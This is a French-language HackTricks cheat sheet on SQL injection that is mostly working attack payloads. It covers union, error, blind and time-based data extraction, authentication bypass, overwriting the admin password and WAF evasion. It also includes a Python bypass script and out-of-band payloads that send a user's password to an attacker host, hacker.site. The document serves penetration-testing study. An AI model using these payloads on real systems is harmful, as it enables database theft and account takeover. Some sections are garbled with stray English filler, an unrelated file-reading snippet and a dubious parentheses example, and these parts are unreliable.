# Injection SQL

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) est l'√©v√©nement de cybers√©curit√© le plus important en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans toutes les disciplines.

{% embed url="https://www.rootedcon.com/" %}

## Qu'est-ce que l'injection SQL ?

L'injection SQL est une vuln√©rabilit√© de s√©curit√© web qui permet √† un attaquant d'**interf√©rer** avec les **requ√™tes** qu'une application fait √† sa **base de donn√©es**. Elle permet g√©n√©ralement √† un attaquant de **visualiser des donn√©es** auxquelles il n'a normalement pas acc√®s. Cela peut inclure des donn√©es appartenant √† **d'autres utilisateurs**, ou toute autre donn√©e √† laquelle l'**application** elle-m√™me est capable d'**acc√©der**. Dans de nombreux cas, un attaquant peut **modifier** ou **supprimer** ces donn√©es, provoquant des changements persistants dans le contenu ou le comportement de l'application.\
Dans certaines situations, un attaquant peut intensifier une attaque d'injection SQL pour **compromettre le serveur sous-jacent** ou toute autre infrastructure en arri√®re-plan, ou effectuer une attaque de d√©ni de service. (De [ici](https://portswigger.net/web-security/sql-injection)).

> Dans ce POST, je vais supposer que nous avons trouv√© une possible injection SQL et nous allons discuter des m√©thodes possibles pour confirmer l'injection SQL, reconna√Ætre la base de donn√©es et effectuer des actions.

## D√©tection du point d'entr√©e

Vous avez peut-√™tre trouv√© un site qui est **apparemment vuln√©rable √† l'injection SQL** simplement parce que le serveur se comporte de mani√®re √©trange avec les entr√©es li√©es √† l'injection SQL. Par cons√©quent, la **premi√®re chose** √† faire est de savoir comment **injecter des donn√©es dans la requ√™te sans la casser**. Pour ce faire, vous devez d'abord trouver comment **√©chapper du contexte actuel**.\
Voici quelques exemples utiles :
```
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
Ensuite, vous devez savoir comment **corriger la requ√™te pour qu'il n'y ait pas d'erreurs**. Pour corriger la requ√™te, vous pouvez **entrer** des donn√©es pour que la **requ√™te pr√©c√©dente accepte les nouvelles donn√©es**, ou vous pouvez simplement **entrer** vos donn√©es et **ajouter un symbole de commentaire √† la fin**.

Notez que si vous pouvez voir des messages d'erreur ou rep√©rer des diff√©rences lorsque la requ√™te fonctionne et quand elle ne fonctionne pas, cette phase sera plus facile.

### **Commentaires**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### Confirmation avec des op√©rations logiques

L'une des meilleures fa√ßons de confirmer une injection SQL est de la faire fonctionner avec une **op√©ration logique** et d'obtenir les r√©sultats attendus.\
Par exemple : si le param√®tre GET `?username=Peter` renvoie le m√™me contenu que `?username=Peter' or '1'='1`, alors vous avez trouv√© une injection SQL.

Vous pouvez √©galement appliquer ce concept aux **op√©rations math√©matiques**. Exemple : si `?id=1` renvoie la m√™me chose que `?id=2-1`, injection SQL.
```
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
Cette liste de mots a √©t√© cr√©√©e pour essayer de **confirmer les injections SQL** de la mani√®re propos√©e :

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### Confirmation avec le temps

Dans certains cas, vous **ne remarquerez aucun changement** sur la page que vous testez. Par cons√©quent, une bonne fa√ßon de **d√©couvrir les injections SQL aveugles** est de faire effectuer des actions √† la base de donn√©es qui auront un **impact sur le temps** n√©cessaire au chargement de la page.\
Par cons√©quent, nous allons concat√©ner dans la requ√™te SQL une op√©ration qui prendra beaucoup de temps pour se terminer :
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
Dans certains cas, les **fonctions de sommeil ne seront pas autoris√©es**. Dans ce cas, au lieu d'utiliser ces fonctions, vous pouvez faire en sorte que la requ√™te effectue des op√©rations complexes qui prendront plusieurs secondes. _Des exemples de ces techniques seront comment√©s s√©par√©ment pour chaque technologie (le cas √©ch√©ant)_.

### Identification du back-end

La meilleure fa√ßon d'identifier le back-end est d'essayer d'ex√©cuter des fonctions des diff√©rents back-ends. Vous pouvez utiliser les **fonctions de sommeil** de la section pr√©c√©dente ou celles-ci :
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
De plus, si vous avez acc√®s √† la sortie de la requ√™te, vous pouvez faire en sorte qu'elle **affiche la version de la base de donn√©es**.

{% hint style="info" %}
Dans la suite, nous allons discuter de diff√©rentes m√©thodes pour exploiter diff√©rents types d'injections SQL. Nous utiliserons MySQL comme exemple.
{% endhint %}

### Identification avec PortSwigger

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## Exploitation bas√©e sur Union

### D√©tection du nombre de colonnes

Si vous pouvez voir la sortie de la requ√™te, c'est la meilleure fa√ßon de l'exploiter.\
Tout d'abord, nous devons trouver le **nombre** de **colonnes** que la **requ√™te initiale** renvoie. Cela est d√ª au fait que **les deux requ√™tes doivent renvoyer le m√™me nombre de colonnes**.\
Deux m√©thodes sont g√©n√©ralement utilis√©es √† cette fin :

#### Order/Group by

Continuez √† incr√©menter le nombre jusqu'√† ce que vous obteniez une r√©ponse fausse. Bien que GROUP BY et ORDER BY aient des fonctionnalit√©s diff√©rentes en SQL, ils peuvent tous deux √™tre utilis√©s de la m√™me mani√®re pour d√©terminer le nombre de colonnes dans la requ√™te.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

S√©lectionnez de plus en plus de valeurs nulles jusqu'√† ce que la requ√™te soit correcte :
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_Vous devriez utiliser des valeurs `null` car dans certains cas, le type des colonnes des deux c√¥t√©s de la requ√™te doit √™tre le m√™me et null est valide dans tous les cas._

### Extraire les noms de la base de donn√©es, les noms de table et les noms de colonne

Dans les exemples suivants, nous allons r√©cup√©rer le nom de toutes les bases de donn√©es, le nom de la table d'une base de donn√©es, les noms de colonnes de la table :
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
Il existe une m√©thode diff√©rente pour d√©couvrir ces donn√©es sur chaque base de donn√©es diff√©rente, mais la m√©thodologie est toujours la m√™me.

## Exploitation de l'injection bas√©e sur Union cach√©e

Si vous pouvez voir la sortie de la requ√™te mais que vous ne pouvez pas r√©aliser une injection bas√©e sur Union, vous √™tes confront√© √† une injection bas√©e sur Union cach√©e.\
Dans cette situation, vous vous retrouvez avec une injection aveugle. Pour transformer l'injection aveugle en une injection bas√©e sur Union, vous devez extraire la requ√™te qui est ex√©cut√©e sur le backend.\
Vous pouvez le faire en utilisant l'injection aveugle et les tables par d√©faut de votre DBMS cible. Pour en savoir plus sur ces tables par d√©faut, lisez la documentation de votre DBMS cible.\
Apr√®s avoir extrait la requ√™te, vous devez ajuster votre charge utile en cons√©quence, en fermant la requ√™te d'origine en toute s√©curit√©. Ensuite, ajoutez une requ√™te d'union √† votre charge utile et commencez √† exploiter l'injection bas√©e sur Union nouvellement obtenue.

Article complet : https://medium.com/@Rend\_/healing-blind-injections-df30b9e0e06f

## Exploitation bas√©e sur les erreurs

Si pour une raison quelconque vous **ne pouvez pas** voir la **sortie** de la **requ√™te** mais que vous pouvez **voir les messages d'erreur**, vous pouvez utiliser ces messages d'erreur pour **extraire** des donn√©es de la base de donn√©es.\
En suivant un flux similaire √† l'exploitation bas√©e sur Union, vous pourriez r√©ussir √† vider la base de donn√©es.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## Exploitation de Blind SQLi

Dans ce cas, vous ne pouvez pas voir les r√©sultats de la requ√™te ou les erreurs, mais vous pouvez **distinguer** quand la requ√™te **renvoie** une r√©ponse **vraie** ou **fausse** car il y a diff√©rents contenus sur la page.\
Dans ce cas, vous pouvez abuser de ce comportement pour vider la base de donn√©es caract√®re par caract√®re :
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## Exploitation d'une injection SQL aveugle bas√©e sur les erreurs

Il s'agit du **m√™me cas que pr√©c√©demment**, mais au lieu de distinguer entre une r√©ponse vraie/fausse de la requ√™te, vous pouvez distinguer entre une **erreur** dans la requ√™te SQL ou non (peut-√™tre parce que le serveur HTTP plante). Par cons√©quent, dans ce cas, vous pouvez forcer une erreur SQL chaque fois que vous devinez correctement le caract√®re :
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## Exploitation de l'injection SQL bas√©e sur le temps

Dans ce cas, il n'y a **aucun moyen de distinguer** la **r√©ponse** de la requ√™te en fonction du contexte de la page. Cependant, vous pouvez faire en sorte que la page **mette plus de temps √† se charger** si le caract√®re devin√© est correct. Nous avons d√©j√† vu cette technique utilis√©e auparavant pour [confirmer une vuln√©rabilit√© SQLi](./#confirming-with-timing).
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Requ√™tes empil√©es

Vous pouvez utiliser des requ√™tes empil√©es pour **ex√©cuter plusieurs requ√™tes successives**. Notez que bien que les requ√™tes suivantes soient ex√©cut√©es, les **r√©sultats ne sont pas renvoy√©s √† l'application**. Par cons√©quent, cette technique est principalement utile en relation avec les **vuln√©rabilit√©s aveugles** o√π vous pouvez utiliser une deuxi√®me requ√™te pour d√©clencher une recherche DNS, une erreur conditionnelle ou un d√©lai de temps.

**Oracle** ne prend pas en charge les **requ√™tes empil√©es**. **MySQL, Microsoft** et **PostgreSQL** les prennent en charge : `REQU√äTE-1-ICI; REQU√äTE-2-ICI`

## Exploitation hors bande

Si **aucune autre** m√©thode d'exploitation **n'a fonctionn√©**, vous pouvez essayer de faire en sorte que la **base de donn√©es exfiltre** les informations vers un **h√¥te externe** contr√¥l√© par vous. Par exemple, via des requ√™tes DNS :
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### Exfiltration de donn√©es hors bande via XXE
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## Exploitation Automatis√©e

Consultez la [SQLMap Cheetsheat](sqlmap/) pour exploiter une vuln√©rabilit√© SQLi avec [**sqlmap**](https://github.com/sqlmapproject/sqlmap).

## Informations sp√©cifiques √† la technologie

Nous avons d√©j√† discut√© de toutes les fa√ßons d'exploiter une vuln√©rabilit√© d'injection SQL. Trouvez d'autres astuces d√©pendantes de la technologie de base de donn√©es dans ce livre :

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

Ou vous trouverez **beaucoup d'astuces concernant : MySQL, PostgreSQL, Oracle, MSSQL, SQLite et HQL dans** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)



<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) est l'√©v√©nement de cybers√©curit√© le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans toutes les disciplines.

{% embed url="https://www.rootedcon.com/" %}

## Contournement de l'authentification

Liste pour essayer de contourner la fonctionnalit√© de connexion :

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### Contournement de l'authentification (MD5 brut)

Lorsqu'un MD5 brut est utilis√©, le mot de passe sera interrog√© en tant que simple cha√Æne, pas en tant que cha√Æne hexad√©cimale.
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
Permettre √† un attaquant de cr√©er une cha√Æne avec une d√©claration `true` telle que `' or 'QUELQUECHOSE`.
```sql
md5("ffifdyop", true) = 'or'6ÔøΩ]ÔøΩÔøΩ!r,ÔøΩÔøΩbÔøΩ
```
Le d√©fi est disponible sur [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)

### Contournement de l'authentification par hachage
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**Liste recommand√©e**:

Vous devriez utiliser chaque ligne de la liste comme nom d'utilisateur et toujours utiliser le mot de passe: _**Pass1234.**_\
_(Ces charges utiles sont √©galement incluses dans la grande liste mentionn√©e au d√©but de cette section)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### Contournement d'authentification GBK

SI ' est √©chapp√©, vous pouvez utiliser %A8%27, et lorsque ' est √©chapp√©, il sera cr√©√©: 0xA80x5c0x27 (_‚ïò'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Script Python :
```python
import requests
url = "http://example.com/index.php" 
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3') 
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"} 
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url}) 
print r.text
```
### Injection polyglotte (multicontexte)

---

#### Description

A polyglot injection is an injection that works in more than one context. For example, a polyglot injection can be a SQL injection that works in both MySQL and MSSQL.

#### How to create a polyglot injection

To create a polyglot injection, you need to find a string that is valid in multiple contexts. For example, the string `1' OR '1'='1` is valid in both MySQL and MSSQL.

#### Example

```sql
SELECT * FROM users WHERE username='admin'--' AND password='1' OR '1'='1';
SELECT * FROM users WHERE username='admin'--' AND password='' OR '1'='1';
```

In the example above, the injection `--' AND password='1' OR '1'='1` works in MySQL, while the injection `--' AND password='' OR '1'='1` works in MSSQL.

#### References

- [Polyglot Injection](https://www.owasp.org/index.php/Polyglot_Injection) (OWASP)
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Instruction d'insertion

### Modifier le mot de passe d'un objet/utilisateur existant

Pour ce faire, vous devriez essayer de **cr√©er un nouvel objet nomm√© comme l'objet "ma√Ætre"** (probablement **admin** dans le cas des utilisateurs) en modifiant quelque chose :

* Cr√©er un utilisateur nomm√© : **AdMIn** (lettres majuscules et minuscules)
* Cr√©er un utilisateur nomm√© : **admin=**
* **Attaque de troncature SQL** (lorsqu'il y a une sorte de **limite de longueur** dans le nom d'utilisateur ou l'e-mail) --> Cr√©er un utilisateur avec le nom : **admin \[beaucoup d'espaces] a**

#### Attaque de troncature SQL

Si la base de donn√©es est vuln√©rable et que le nombre maximal de caract√®res pour le nom d'utilisateur est par exemple de 30 et que vous voulez vous faire passer pour l'utilisateur **admin**, essayez de cr√©er un nom d'utilisateur appel√© : "_admin \[30 espaces] a_" et n'importe quel mot de passe.

La base de donn√©es **v√©rifiera** si le **nom d'utilisateur** **introduit existe** dans la base de donn√©es. Si ce n'est pas le cas, elle **coupera** le **nom d'utilisateur** au **nombre maximal de caract√®res autoris√©s** (dans ce cas, "_admin \[25 espaces]_") et elle **supprimera automatiquement tous les espaces √† la fin en mettant √† jour** dans la base de donn√©es l'utilisateur "**admin**" avec le **nouveau mot de passe** (une erreur pourrait appara√Ætre, mais cela ne signifie pas que cela n'a pas fonctionn√©).

Plus d'informations : [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Remarque : Cette attaque ne fonctionnera plus comme d√©crit ci-dessus dans les derni√®res installations MySQL. Bien que les comparaisons ignorent toujours les espaces de fin par d√©faut, toute tentative d'ins√©rer une cha√Æne qui est plus longue que la longueur d'un champ entra√Ænera une erreur et l'insertion √©chouera. Pour plus d'informations √† ce sujet, consultez_ [_https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation_](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)\_\_

### V√©rification bas√©e sur le temps d'insertion MySQL

Ajoutez autant de `','',''` que vous le jugez n√©cessaire pour sortir de l'instruction VALUES. Si le d√©lai est ex√©cut√©, vous avez une injection SQL.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

Les mots-cl√©s ON DUPLICATE KEY UPDATE sont utilis√©s pour indiquer √† MySQL quoi faire lorsque l'application tente d'ins√©rer une ligne qui existe d√©j√† dans la table. Nous pouvons l'utiliser pour changer le mot de passe de l'administrateur en:
```
Inject using payload:
  attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --

The query would look like this:
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");

This query will insert a row for the user ‚Äúattacker_dummy@example.com‚Äù. It will also insert a row for the user ‚Äúadmin@example.com‚Äù.
Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to "bcrypt_hash_of_qwerty".

After this, we can simply authenticate with ‚Äúadmin@example.com‚Äù and the password ‚Äúqwerty‚Äù!
```
### Extraire des informations

#### Cr√©ation de 2 comptes en m√™me temps

Lorsque vous essayez de cr√©er un nouvel utilisateur, un nom d'utilisateur, un mot de passe et une adresse e-mail sont n√©cessaires :
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### Utilisation de d√©cimal ou hexad√©cimal

Avec cette technique, vous pouvez extraire des informations en cr√©ant seulement 1 compte. Il est important de noter que vous n'avez pas besoin de commenter quoi que ce soit.

En utilisant **hex2dec** et **substr** :
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
```
with open('/hive/hacktricks/pentesting-web/sql-injection/README.md', 'r') as file:
    text = file.read()
print(text)
```
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
Utilisation de **hex** et **replace** (et **substr**) :
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) est l'√©v√©nement de cybers√©curit√© le plus pertinent en Espagne et l'un des plus importants en Europe. Avec pour mission de promouvoir les connaissances techniques, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans toutes les disciplines.

{% embed url="https://www.rootedcon.com/" %}

## Injection SQL rout√©e

L'injection SQL rout√©e est une situation o√π la requ√™te injectable n'est pas celle qui donne une sortie, mais la sortie de la requ√™te injectable va √† la requ√™te qui donne une sortie. ([Article](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Exemple :
```sql
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## Contournement de WAF

### Contournement sans espaces

Pas d'espace (%20) - contournement en utilisant des alternatives d'espacement.
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
# Pas d'espace blanc - contournement en utilisant des commentaires

Lorsque l'injection SQL est effectu√©e dans une requ√™te qui ne permet pas l'utilisation d'espaces blancs, il est possible de contourner cette restriction en utilisant des commentaires.

## Contournement

La technique consiste √† utiliser des commentaires pour masquer les espaces blancs. Les commentaires sont ignor√©s par le moteur de base de donn√©es, donc tout ce qui est plac√© √† l'int√©rieur d'un commentaire ne sera pas consid√©r√© comme un espace blanc.

### Exemple

Supposons que nous avons une requ√™te qui ressemble √† ceci :

```
SELECT * FROM users WHERE username='admin' AND password='1234'
```

Pour contourner la restriction d'espaces blancs, nous pouvons utiliser des commentaires pour masquer les espaces blancs de la mani√®re suivante :

```
SELECT/**/*/**/FROM/**/users/**/WHERE/**/username='admin'/**/AND/**/password='1234'
```

Dans cet exemple, nous avons utilis√© des commentaires pour masquer les espaces blancs entre les mots cl√©s et les noms de table, ainsi qu'entre les noms de colonnes et les valeurs.

## Conclusion

L'utilisation de commentaires pour contourner les restrictions d'espaces blancs est une technique courante en injection SQL. Il est important de comprendre comment cela fonctionne pour pouvoir d√©tecter et pr√©venir les attaques.
```sql
?id=1/*comment*/and/**/1=1/**/--
```
# Pas d'espaces - contournement en utilisant des parenth√®ses

Lorsque l'injection SQL est effectu√©e dans une requ√™te sans espaces, il peut √™tre difficile de contourner les filtres de caract√®res. Cependant, une technique courante consiste √† utiliser des parenth√®ses pour contourner les filtres.

## Contournement

Consid√©rons la requ√™te suivante:

```
SELECT * FROM users WHERE username='admin' AND password='[INJECTION POINT]'
```

Supposons que l'injection SQL soit la suivante:

```
' or '1'='1
```

La requ√™te finale ressemblerait √† ceci:

```
SELECT * FROM users WHERE username='admin' AND password='' or '1'='1'
```

Cependant, si la requ√™te ne contient pas d'espaces, la technique pr√©c√©dente ne fonctionnera pas. Dans ce cas, nous pouvons utiliser des parenth√®ses pour contourner les filtres. La requ√™te finale ressemblerait √† ceci:

```
SELECT * FROM users WHERE username='admin' AND password=('')
OR ('1'='1')
```

Dans cet exemple, nous avons utilis√© des parenth√®ses pour entourer la cha√Æne vide, ce qui nous permet d'ajouter notre injection SQL √† l'int√©rieur des parenth√®ses. De cette fa√ßon, nous avons contourn√© les filtres de caract√®res et r√©ussi √† injecter notre code malveillant dans la requ√™te.

## Conclusion

Lorsque vous √™tes confront√© √† une injection SQL dans une requ√™te sans espaces, utilisez des parenth√®ses pour contourner les filtres de caract√®res et injecter votre code malveillant.
```sql
?id=(1)and(1)=(1)--
```
### Contournement sans virgule

Pas de virgule - contournement en utilisant OFFSET, FROM et JOIN
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### Contournements g√©n√©riques

Liste noire utilisant des mots-cl√©s - contournement en utilisant des majuscules/minuscules
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
# Contourner une liste noire de mots-cl√©s insensible √† la casse en utilisant un op√©rateur √©quivalent

